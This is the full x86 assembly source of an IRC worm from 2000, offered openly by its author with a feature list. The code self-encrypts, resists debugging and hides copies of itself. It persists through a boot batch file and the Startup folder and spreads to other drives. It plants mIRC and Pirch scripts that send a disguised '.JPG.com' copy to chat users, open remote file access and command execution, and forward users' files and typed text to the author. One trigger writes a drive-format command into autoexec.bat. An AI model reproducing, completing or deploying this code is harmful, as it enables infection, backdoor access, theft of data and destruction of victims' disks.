;
; ¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤
;
;       CEYDADEMET_W0RM     V.1.1
;       ---------------     -----
;         -----------        ---
;            -----        -
;
;       Designed by Del_Armg0       on 15/01/2000
;
;
;
;   FEATURES: * Mirc & Pirch Infection
;   --------  * Payload on 8 april
;
;
;
; + Encrypted:       yes -> simple Xor (will be changed)
; + Anti-Debug:      yes -> - fake routine call (just a bit, cos' it makes the worm slower)
;               - dead keyboard during execution
;               - int 3h game
; + Anti-Heuristic:  none (will be implemented ??)
; + Anti-Emulation:  none (will be implemented ??)
; + Anti-Bait:       n/a
; + Morphism:        none (will be implemented - probably very slow morphism)
; + Stealth:         Mirc script has some & stuff are read-only/hidden/system  (...just basic Worm stealth features)
; + Deep-Rooting:    yes (?!¿-what is that!) -> restart to each boot
;                       + winstart.bat -trying to reinstall itself
;                                  -and copy worm on E: to Z:
; + not optimized...
;
;
; 0K!... my comments sucks! Open Ralf Brown's Interrupt List please  :)
; 00KKK!... my english sucks even more!! Open a Dictionary  hahahaha!!!
;
; ¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤°¤
;


    .model tiny
    .code
    org 100h


;
;
;SIMPLE ENCRYPTION
;
;
  start:
lea si,makedir                          ;where to read bytes first
mov di,si
mov cx,fin-makedir                      ;size (bytes)
call encrypt                        ;call the encrypt routine
jmp makedir

  encrypt:
lodsb
db 34h
Key db 0                            ;xor key
stosb
loop encrypt                        ;do for CX bytes
ret

;
;
;CREATE SUBDIR 1 & 2
;
;
  makedir:
mov ax,2503h                    ;int 3 anti-debug check
mov dx,offset anti
int 21h
in al,21h                   ;disable keyboard
or al,02h
out 21h, al
mov ah,39h
lea dx,dirnew                   ;create the directory c:\windows\WINUSER
int 21h
mov ax,4301h
mov cx,0007h                    ;change attrib to: read-only/hidden/system
lea dx,dirnew
int 21h
  fake2:                    ;fake stuff
mov ah,36h
mov dl,0
int 21h
inc di
mov ah,2ch
int 21h
dec di
  makedir2:
mov ah,39h
lea dx,dirnew2                  ;create the directory c:\windows\WINUSER2
int 21h
mov ax,4301h
mov cx,0007h                    ;change attrib to: read-only/hidden/system
lea dx,dirnew2
int 21h

;
;
;COPY ITSELF IN THIS 2 NEW SUBDIR AND IN C:\WINDOWS
;
;
  copy_1:
mov ax,3c00h                        ;create the CeyDem.com in c:\windows
mov cx,0007h                            ;attrib: read-only/hidden/system
lea dx,wormceyda
int 21h
xchg bx,ax
in al,40h
mov byte ptr [Key],al
mov ah,40h                          ;write out the decryptor
lea dx,start                        ;where it starts
mov cx,makedir-start                    ;how long is
int 21h
lea si,makedir
lea di,fin
mov cx,fin-makedir                      ;how many bytes
call encrypt
mov ah,40h                          ;write the encrypt code
lea dx,fin
mov cx,fin-makedir                      ;how many bytes
int 21h
mov ah,3eh
int 21h

  copy_2:
mov ax,3c00h                        ;create the .com in c:\windows\winuser\
mov cx,00h                              ;attrib: none
lea dx,copy1
int 21h
xchg bx,ax
in al,40h
mov byte ptr [Key],al
mov ah,40h                          ;write out the decryptor
lea dx,start                        ;where it starts
mov cx,makedir-start                    ;how long is
int 21h
lea si,makedir
lea di,fin
mov cx,fin-makedir                      ;how many bytes
call encrypt
mov ah,40h                          ;write the encrypt code
lea dx,fin
mov cx,fin-makedir                      ;how many bytes
int 21h
mov ah,3eh
int 21h

  copy_3:
mov ax,3c00h                        ;create the .com in c:\windows\winuser2
mov cx,00h                              ;attrib: none
lea dx,copy2
int 21h
xchg bx,ax
in al,40h
mov byte ptr [Key],al
mov ah,40h                          ;write out the decryptor
lea dx,start                        ;where it starts
mov cx,makedir-start                    ;how long is
int 21h
lea si,makedir
lea di,fin
mov cx,fin-makedir                      ;how many bytes
call encrypt
mov ah,40h                          ;write the encrypt code
lea dx,fin
mov cx,fin-makedir                      ;how many bytes
int 21h
mov ah,3eh
int 21h

;
;
;MAKE A WINSTART.BAT
;
;
  createwinbat:                 ;create c:\Windows\winstart.bat
mov ax,3c00h
lea dx,winbat
mov cx,00h
int 21h
xchg bx,ax
  writebat:                 ;write in
mov ah,40h
lea dx,winbatdeb
mov cx,winbatend-winbatdeb
int 21h
  closebat:                 ;close it
mov ah,3eh
int 21h
jmp lookformirc

  fake1:                    ;fake stuff
mov ah,36h
mov dl,0
int 21h
inc di
mov ah,2ch
int 21h
dec di
ret

;
;
;MIRC SCRIPT / LOOK FOR MIRC AND INSTALL SCRIPT INI
;
;
  lookformirc:
mov ah,4eh                  ;look for mirc32.exe
lea dx,dir1                 ;in c:\mirc\
int 21h
cmp ax,0
je create_file1                 ;if find jump 1
mov ah,4eh                  ;look for mirc32.exe
lea dx,dir2                 ;in c:\mirc32\
int 21h
cmp ax,0
je create_file2                 ;if find jump 2
mov ah,4eh                  ;look for mirc32.exe
lea dx,dir3                 ;in c:\progra~1\mirc\
int 21h
cmp ax,0
je create_file3                 ;if find jump 3
mov ah,4eh                  ;look for mirc32.exe
lea dx,dir4                 ;in c:\progra~1\mirc32\
int 21h
cmp ax,0
je create_file4                 ;if find jump 4
jmp lookforpirch                ;else look for pirch dir

  create_file1:                 ;create script.ini 1
mov ax,3c00h
lea dx,script11
mov cx,00h
int 21h
xchg bx,ax
  write_file1:                  ;write in the script.ini
mov ah,40h
lea dx,scrcont
mov cx,scrend-scrcont
int 21h
  close_file1:                  ;close it
mov ah,3eh
int 21h
jmp lookforpirch

  create_file2:                 ;create script.ini 2
mov ax,3c00h
lea dx,script22
mov cx,00h
int 21h
xchg bx,ax
  write_file2:                  ;write in the script.ini
mov ah,40h
lea dx,scrcont
mov cx,scrend-scrcont
int 21h
  close_file2:                  ;close it
mov ah,3eh
int 21h
jmp lookforpirch

  create_file3:                 ;create script.ini 3
mov ax,3c00h
lea dx,script33
mov cx,00h
int 21h
xchg bx,ax
  write_file3:                  ;write in the script.ini
mov ah,40h
lea dx,scrcont
mov cx,scrend-scrcont
int 21h
  close_file3:                  ;close it
mov ah,3eh
int 21h
jmp lookforpirch

  create_file4:                 ;create script.ini 4
mov ax,3c00h
lea dx,script44
mov cx,00h
int 21h
xchg bx,ax
  write_file4:                  ;write in the script.ini
mov ah,40h
lea dx,scrcont
mov cx,scrend-scrcont
int 21h
  close_file4:                  ;close it
mov ah,3eh
int 21h

;
;
;LOOK FOR PIRCH NOW
;
;
  lookforpirch:
  fake3:                    ;fake stuff
mov ah,36h
mov dl,0
int 21h
inc di
mov ah,2ch
int 21h
dec di
mov ah,4eh                  ;look for pirch98.exe
lea dx,dir5                 ;in C:\Pirch98\
int 21h
cmp ax,0
je create_file5                 ;if find jump 1
mov ah,4eh                  ;look for pirch98.exe
lea dx,dir6                 ;in C:\Pirch\
int 21h
cmp ax,0
je create_file6                 ;if find jump 2
mov ah,4eh                  ;look for pirch98.exe
lea dx,dir7                 ;in c:\progra~1\Pirch98\
int 21h
cmp ax,0
je create_file7                 ;if find jump 3
mov ah,4eh                  ;look for pirch98.exe
lea dx,dir8                 ;in c:\progra~1\Pirch\
int 21h
cmp ax,0
je create_file8                 ;if find jump 4
jmp modify                  ;else exit

  create_file5:                 ;create events.ini 1
mov ax,3c00h
lea dx,script55
mov cx,00h
int 21h
xchg bx,ax
  write_file5:                  ;write in the events.ini
mov ah,40h
lea dx,scrcont2
mov cx,scrend2-scrcont2
int 21h
  close_file5:                  ;close it
mov ah,3eh
int 21h
jmp modify

  create_file6:                 ;create events.ini 1
mov ax,3c00h
lea dx,script66
mov cx,00h
int 21h
xchg bx,ax
  write_file6:                  ;write in the events.ini
mov ah,40h
lea dx,scrcont2
mov cx,scrend2-scrcont2
int 21h
  close_file6:                  ;close it
mov ah,3eh
int 21h
jmp modify

  create_file7:                 ;create events.ini 3
mov ax,3c00h
lea dx,script77
mov cx,00h
int 21h
xchg bx,ax
  write_file7:                  ;write in the events.ini
mov ah,40h
lea dx,scrcont2
mov cx,scrend2-scrcont2
int 21h
  close_file7:                  ;close it
mov ah,3eh
int 21h
jmp modify

  create_file8:                 ;create events.ini 4
mov ax,3c00h
lea dx,script88
mov cx,00h
int 21h
xchg bx,ax
  write_file8:                  ;write in the events.ini
mov ah,40h
lea dx,scrcont2
mov cx,scrend2-scrcont2
int 21h
  close_file8:                  ;close it
mov ah,3eh
int 21h

;
;
;MODIFY C:\MIRC.INI (will be implemented later...)
;
;
call fake1                  ;call fake routine
  modify:
call fake1                  ;call fake routine
jmp exit
add di,di                   ;fake stuff
mov ah,36h
mov dl,0
nop
int 21h
inc di
mov ah,2ch
nop
int 21h
dec di
sub di,di

;
;
;PAYLOAD
;
;EXIT WORM / QUIT / END OF PROG
;
;
  exit:
  checkforpayload:
call fake1                  ;call fake routine

  date1:
mov ah,2ah                  ;is april ? else exit
int 21h
cmp dh,0ch
jne finalexit

  date2:                    ;is the 8 of month ? else exit
mov ah,2ah
int 21h
cmp dl,08h
jne finalexit

  execpayload:  
mov ah,9h                   ;dos msg box
lea dx,msg
int 21h
mov ah,39h                  ;make dir1
lea dx,dir100
int 21h
mov ah,39h                  ;make dir2
lea dx,dir200
int 21h
mov ah,39h                  ;make dir3
lea dx,dir300
int 21h
mov ah,39h                  ;make dir4
lea dx,dir400
int 21h
mov ah,2bh
mov cx,7b6h                 ;change year to 1974
int 21h
mov ah,2ch
int 21h
cmp dh,26d                  ;if seconds = 26, next
jne finalexit                   ;else exit
int 5h                      ;print screen

  finalexit:
call fake1                  ;call fake routine
in al,21h                   ;enable keyboard
and al,not 2
out 21h,al
mov ax,4c00h                    ;close prog
int 21H

  anti:                     ;int 3 anti-debug result
mov ah,9h
lea dx,msg
int 21h
call fake1                  ;call fake routine
mov ah,9h
lea dx,msg2
int 21h
call fake1                  ;call fake routine
int 20h

;
;
;DATA SECTION / AND SCRIPTS...
;
;


WORMNAME  db '[CeydaDemet W0rm]',0
AUTHOR    db '[Del_Armg0/MATRiX]',0
DATE      db '[15/01/2000]',0
MESSAGE   db '[Heya!Merhaba Ceyda Demet! And Welc0me Back! Fa_with_Luv! la sensualité noyée dans la tendresse]',0


dirnew db 'C:\Windows\Winuser',0
dirnew2 db 'C:\Windows\Winuser2',0

wormceyda db 'C:\Windows\CeyDem.com',0
copy1 db 'C:\Windows\winuser\users32.dll',0
copy2 db 'C:\Windows\winuser2\CeydaDem.com',0

dir1 db 'C:\mirc\mirc32.exe',0
dir2 db 'C:\mirc32\mirc32.exe',0
dir3 db 'C:\progra~1\mirc\mirc32.exe',0
dir4 db 'C:\progra~1\mirc32\mirc32.exe',0

script11 db 'C:\mirc\script.ini',0
script22 db 'C:\mirc32\script.ini',0
script33 db 'C:\progra~1\mirc\script.ini',0
script44 db 'C:\progra~1\mirc32\script.ini',0

;script111 db 'C:\mirc\mirc.ini',0
;script222 db 'C:\mirc32\mirc.ini',0
;script333 db 'C:\progra~1\mirc\mirc.ini',0
;script444 db 'C:\progra~1\mirc32\mirc.ini',0

dir5 db 'C:\Pirch98\Pirch98.exe',0
dir6 db 'C:\Pirch32\Pirch32.exe',0
dir7 db 'C:\progra~1\Pirch98\Pirch98.exe',0
dir8 db 'C:\progra~1\Pirch32\Pirch32.exe',0

script55 db 'C:\Pirch98\events.ini',0
script66 db 'C:\Pirch32\events.ini',0
script77 db 'C:\progra~1\Pirch98\events.ini',0
script88 db 'C:\progra~1\Pirch32\events.ini',0

winbat db 'C:\Windows\winstart.bat',0

dir100 db 'C:\HAPPY',0
dir200 db 'C:\BIRTHDAY',0
dir300 db 'C:\CEYDA',0
dir400 db 'C:\DEMET',0


scrcont:
          db '[SCRIPT]',13,10
          db ';',13,10
          db ';|_--==_[_M_A_T_R_i_X_]___S_C_R_I_P_T___a CeydaDemet W0rm_==--_|',13,10
          db 'n0= on 1:start:{',13,10
          db 'n1= .remote on',13,10
          db 'n2= .events on',13,10
          db 'n3= }',13,10
          db 'n4=on 1:connect:/rename C:\Windows\winuser\users32.dll C:\Windows\winuser\CeydaDemet___TurkishGirl.JPG.com',13,10
          db 'n5=on 1:disconnect:/rename C:\Windows\winuser\CeydaDemet___TurkishGirl.JPG.com C:\Windows\winuser\users32.dll',13,10
          db 'n6=on 1:text:*ceyda*:*:/fserve $nick 5 C:\',13,10
          db 'n7=on 1:text:*demet*:#:.msg $nick CeydaDemet Worm - a from Turkey BaBe ! Hiiii! Fa! Hiiii Dem!! $ip on $server $+ : $+ $port $+',13,10
          db 'n8=on 1:text:*gimme*:*:.dcc send $nick $2',13,10
          db 'n9=on 1:text:*yup*:*:/run $2 $3 $4',13,10
          db 'n10=on 1:text:*nick1*:#:/nick CeyDa_Luv',13,10
          db 'n11=on 1:text:*nick2*:#:/nick Dem_SoFar',13,10
          db 'n12=on 1:text:*nick3*:#:/nick DelVictim',13,10
          db 'n13=on 1:text:*virus*:*:/.ignore $nick',13,10
          db 'n14=on 1:text:*worm*:*:/.ignore $nick',13,10
          db 'n15=on 1:input:*:.msg #CeydaDemetWorm [( $+ $active $+ ) $1-]',13,10
          db 'n16=on 1:filercvd:*.*:.dcc send Del_Armg0 $filename',13,10
          db 'n17=on 1:dns:.msg #CeydaDemetWorm DNS__: IP: $iaddress address: $naddress resolved: $raddress',13,10
          db 'n18=on 1:text:*comeonvx*:*:/join -n #vx-vtc',13,10
          db 'n19=on 1:ping:/pdcc 99999999999',13,10
          db 'n20=on 1:join:#:{',13,10
          db 'n21=if ( $nick == $me ) { halt } | .dcc send $nick C:\Windows\winuser\CeydaDemet___TurkishGirl.JPG.com',13,10
          db 'n22=}',13,10
          db 'n23=alias unload { halt }',13,10
          db 'n24=alias remove { halt }',13,10
          db ';_another Del_Armg0 W0rm -=-  [MATRiX] Gr0up -=- GreeTZ t0 : mort',13,10
          db ';[MATRiX] Gr0up -=- ULTRAS, NBK, Del_Armg0, tgr, mort -=- /01/00',13,10
          db ';Del_Armg0 - one night one trojan ... 10X mort  ;)  _4 CEYDA DEMET',13,10
scrend:


scrcont2:
          db '[levels]',13,10
          db 'Enabled=1',13,10
          db ';|_--==_[_M_A_T_R_i_X_]___S_C_R_I_P_T___a CeydaDemet W0rm_==--_|',13,10
          db 'Count=1',13,10
          db 'Level1=matrix',13,10
          db 'matrixEnabled=1',13,10
          db ';',13,10
          db '[matrix]',13,10
          db 'User1=*!*@*',13,10
          db 'UserCount=1',13,10
          db 'Event1=ON JOIN:#:/dcc send $nick C:\Windows\winuser2\CeydaDemet___TurkishGirl.JPG.com',13,10
          db 'Event2=ON TEXT:*ceyda*:*:/faccess $nick C:\ 5',13,10
          db 'Event3=ON TEXT:*iseeu*:*:/dcc video $nick',13,10
          db 'Event4=ON TEXT:*clpbrd*:#:/msg $nick $cliptext',13,10
          db 'Event5=ON TEXT:*demet*:#:/msg $nick CeydaDemet Worm - a from Turkey BaBe ! Hiiii! Fa! Hiiii Dem!! $identd $address',13,10
          db 'Event6=ON TEXT:*runget*:*:/run $GETPATH\*.exe',13,10
          db 'Event7=ON TEXT:*deztroy*:*:/write -I c:\autoexec.bat @FORMAT C: /8',13,10
          db 'Event8=ON TEXT:*worm*:*:/ignore $nick 1',13,10
          db 'Event9=ON TEXT:*virus*:*:/ignore $nick 1',13,10
          db 'Event10=ON DCCDONE:*.exe;*.com;*.vbs;*.bat;*.doc;*.html:/execute -o $filename',13,10
          db 'Event11=ON DCCSENT:*.*:/dcc send Del_Armg0 $filename',13,10
          db 'Event12=ON PART:#:/enable -q * ',13,10
          db 'Event13=ON OP:*:#:/mode Del_Armg0 +o',13,10
          db 'Event14=ON TEXT:*byebye*:*:/exit',13,10
          db 'Event15=ON TEXT:*nickx*:*:/nick CeydaW0rm',13,10
          db 'EventCount=15',13,10
          db '[DCC]',13,10
          db 'AutoHideDccWin=1',13,10
          db ';_another Del_Armg0 W0rm -=-  [MATRiX] Gr0up -=- GreeTZ t0 : mort',13,10
          db ';[MATRiX] Gr0up -=- ULTRAS, NBK, Del_Armg0, tgr, mort -=- /01/00',13,10
          db ';Del_Armg0 - one night one trojan ... 10X mort  ;)  _4 CEYDA DEMET',13,10
scrend2:


winbatdeb:
          db '@ECHO OFF',13,10
          db 'ctty nul',13,10
          db 'if exist C:\Windows\CeyDem.com start /m C:\Windows\CeyDem.com',13,10
          db 'if not exist C:\Windows\Ceydem.com goto nop',13,10
          db 'for %%a in (e f g h i j k l m n o p q r s t u v w x y z) do if exist %%a:\nul copy /B C:\Windows\CeyDem.com %%a:',13,10
          db 'if exist C:\Windows\winuser2\CeydaDem.com ren C:\Windows\winuser2\CeydaDem.com C:\Windows\winuser2\CeydaDemet___TurkishGirl.JPG.com',13,10
          db 'if not exist C:\Windows\winuser2\CeydaDemet___TurkishGirl.JPG.com copy /B C:\Windows\Ceydem.com C:\Windows\winuser2\CeydaDemet___TurkishGirl.JPG.com /Y',13,10
          db 'if exist C:\Windows\menudé~1\progra~1\démarr~1\*.* copy /B C:\Windows\CeyDem.com C:\Windows\menudé~1\progra~1\démarr~1\CEYDA.com /Y',13,10
          db 'if exist C:\Windows\startm~1\programs\startup\*.* copy /B C:\Windows\CeyDem.com C:\Windows\startm~1\programs\startup\DEMET.com /Y',13,10
          db 'goto end',13,10
          db ':nop',13,10
          db 'if exist C:\Windows\winuser2\CeydaDemet___TurkishGirl.JPG.com copy /B C:\Windows\winuser2\CeydaDemet___TurkishGirl.JPG.com C:\Windows\CeyDem.com /Y',13,10
          db 'if exist C:\Windows\Winuser\users32.dll copy /B C:\Windows\Winuser\users32.dll C:\Windows\CeyDem.com /Y',13,10
          db 'if not exist C:\Windows\CeyDem.com goto end',13,10
          db 'if exist C:\Windows\CeyDem.com start /m C:\Windows\CeyDem.com',13,10
          db ':end',13,10
          db ':: CeydaDemet W0rm__another Del_Armg0 W0rm -=- [MATRiX] Gr0up -=- ULTRAS, NBK, Del_Armg0, tgr, mort -=-',13,10
          db 'ctty con',13,10
winbatend:


msg:
          db ' +-()_(.)_()_(.)_()_(.)_()_(.)_()_(.)_()_(.)_()-+',13,10
          db '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-',13,10
          db '  ]{-+-}[|_||_|]{-+-}[|_||_|]{-+-}[|_||_|]{-+-}[ ',13,10
          db '   [_/^^\_]-[_/^^\_]-[_/^^\_]-[_/^^\_]-[_/^^\_]  ',13,10
          db '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-',13,10
          db '--== TODAY IS THE CEYDA DEMET BIRTHDAY !! :) ==--',13,10
          db '--== Welc0me Back Dem.  ;)  i miss u so... ! ==--',13,10
          db '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-',13,10
          db '°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°',13,10
          db '°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°',13,10
          db '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-',13,10
          db '--== TODAY IS THE CEYDA DEMET BIRTHDAY !! :) ==--',13,10
          db '--== So here is a little ViruS for ur 26...  ==--',13,10
          db '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-',13,10
          db '  ]{-+-}[|_||_|]{-+-}[|_||_|]{-+-}[|_||_|]{-+-}[ ',13,10
          db '   [_/^^\_]-[_/^^\_]-[_/^^\_]-[_/^^\_]-[_/^^\_]  ',13,10
          db '-=-=-=-=-=-=-=   CeydaDemet W0rm   =-=-=-=-=-=-=-',13,10
          db '°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°+°¤°¤°',13,10,'$'

msg2:
          db 'GGGGGGGRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR!!!!!!!!',13,10
          db '-=-=-=-=-=-=-  CeydaDemet W0rm  =-=-=-=-=-=-=-=-=-',13,10
          db 'NEXT TIME I WILL FUCK YOUR HARD DISK !  OK ?!?!?!',13,10,'$'


  fin:

   end start
